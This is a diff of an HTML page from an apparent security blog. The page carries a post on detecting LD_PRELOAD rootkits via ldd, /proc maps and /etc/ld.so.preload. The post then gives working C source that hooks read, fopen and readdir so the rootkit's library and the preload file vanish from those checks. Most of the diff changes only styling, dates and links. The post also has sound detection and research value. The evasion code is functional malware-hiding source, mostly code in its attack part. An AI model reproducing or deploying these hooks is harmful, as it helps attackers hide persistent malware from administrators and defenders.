@@ -10,14 +10,14 @@
 <meta name="description" content="Learn how to detect and hide a LD_PRELOAD rootkit from ldd, /proc/pid/maps, etc.">
 <meta name="author" content="0xMatheuZ">
 <link rel="canonical" href="http://localhost:1313/hacking/ldpreload-rootkit/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.611f494600a4afa7b7b325284339ae62e7d3910f41f3722c0f53143c5cd6e8e7.css" integrity="sha256-YR9JRgCkr6e3syUoQzmuYufTkQ9B83IsD1MUPFzW6Oc=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
 <link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
 <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="theme-color" content="#06070b">
+<meta name="msapplication-TileColor" content="#06070b">
 <link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/ldpreload-rootkit/">
 <noscript>
     <style>
@@ -27,12 +27,15 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="How detect a LD_PRELOAD rootkit and hide from ldd &amp; /proc" />
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=Press+Start+2P&display=swap" rel="stylesheet">
+<meta property="og:title" content="How detect a LD_PRELOAD rootkit and hide from ldd &amp; /proc" />
 <meta property="og:description" content="Learn how to detect and hide a LD_PRELOAD rootkit from ldd, /proc/pid/maps, etc." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/hacking/ldpreload-rootkit/" /><meta property="article:section" content="hacking" />
-
-<meta property="og:site_name" content="0xMatheuZ" />
+<meta property="article:published_time" content="2024-11-26T20:06:42-08:00" />
+<meta property="article:modified_time" content="2024-11-26T20:06:42-08:00" /><meta property="og:site_name" content="0xMatheuZ" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="How detect a LD_PRELOAD rootkit and hide from ldd &amp; /proc"/>
@@ -47,7 +50,7 @@
     {
       "@type": "ListItem",
       "position":  1 ,
-      "name": "Hackings",
+      "name": "Hacking",
       "item": "http://localhost:1313/hacking/"
     }, 
     {
@@ -72,8 +75,8 @@
   "articleBody": "Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can’t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include #include #include #include #include ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \"read\"); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u003e 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u003c end) { char *line_start = current; char *line_end = memchr(current, '\\n', end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \"hook.so\", strlen(\"hook.so\"))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u003e new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \"hook.so\", using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \"hook.so\" is deleted through functions like memm and memchr, effectively “hiding” the string by copying only the lines that don’t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that’s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it “impossible” to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #define HIDDEN_FILE \"/etc/ld.so.preload\" FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \"fopen\"); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \"read\"); } char path[PATH_MAX]; snprintf(path, sizeof(path), \"/proc/self/fd/%d\", fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u003e 0) { actual_path[len] = '\\0'; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \"readdir\"); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u003ed_name, \"ld.so.preload\") != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more “stealth”.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn’t 100% perfect, but it’s cool to understand how this process works.\nPlot Twist Well… here’s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n",
   "wordCount" : "1261",
   "inLanguage": "en",
-  "datePublished": "0001-01-01T00:00:00Z",
-  "dateModified": "0001-01-01T00:00:00Z",
+  "datePublished": "2024-11-26T20:06:42-08:00",
+  "dateModified": "2024-11-26T20:06:42-08:00",
   "author":{
     "@type": "Person",
     "name": "0xMatheuZ"
@@ -99,9 +102,8 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="MatheuZ (Alt + H)">
-                <img src="https://i.imgur.com/xeSd64L.png" alt="" aria-label="logo"
-                    height="25">MatheuZ</a>
+            <a href="/" accesskey="h" title="MatheuZ (Alt + H)">
+                <img src="/img/0xm-badge.png" alt="" aria-label="logo" height="28">MatheuZ</a>
             <div class="logo-switches">
                 <ul class="lang-switch"><li>|</li>
                 </ul>
@@ -109,22 +111,22 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/hacking" title="hacking">
+                <a href="/hacking" title="hacking">
                     <span>hacking</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags" title="Tags">
+                <a href="/tags" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="/search" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -135,14 +137,24 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/hacking/">Hacking</a></div>
+    <div class="post-context">
+      <span>Red Team</span>
+      <span>Offensive Security Research</span>
+      <span>Pentest</span>
+      <span>hacking</span>
+    </div>
     <h1 class="post-title entry-hint-parent">
       How detect a LD_PRELOAD rootkit and hide from ldd &amp; /proc
     </h1>
     <div class="post-description">
       Learn how to detect and hide a LD_PRELOAD rootkit from ldd, /proc/pid/maps, etc.
     </div>
-    <div class="post-meta">6 min&nbsp;·&nbsp;0xMatheuZ
+    <div class="post-badges">
+      <span>Evasion</span>
+      <span>#Rootkit</span>
+    </div>
+    <div class="post-meta"><span title='2024-11-26 20:06:42 -0800 -0800'>November 26, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;0xMatheuZ
 
 </div>
   </header> 
@@ -387,18 +399,18 @@ struct dirent *readdir(DIR *dirp)
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/rootkit/">Rootkit</a></li>
+      <li><a href="/tags/rootkit/">Rootkit</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/hacking/bypassing-elastic/">
+  <a class="prev" href="/hacking/ftrace-rootkit/">
     <span class="title">« Prev</span>
     <br>
-    <span>Evading Elastic Security: Linux Rootkit Detection Bypass</span>
+    <span>Detecting rootkits based on ftrace hooking.</span>
   </a>
-  <a class="next" href="http://localhost:1313/hacking/ioctl-secrets/">
+  <a class="next" href="/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/">
     <span class="title">Next »</span>
     <br>
-    <span>Ioctl Secrets Writeup</span>
+    <span>A simple way to detect and remove LKM rootkit KoviD (Outdated)</span>
   </a>
 </nav>
 
@@ -407,7 +419,7 @@ struct dirent *readdir(DIR *dirp)
     </main>
     
 <footer class="footer">
-    <span>&copy; 2026 <a href="http://localhost:1313/">0xMatheuZ</a></span>
+    <span>&copy; 2026 <a href="/">0xMatheuZ</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
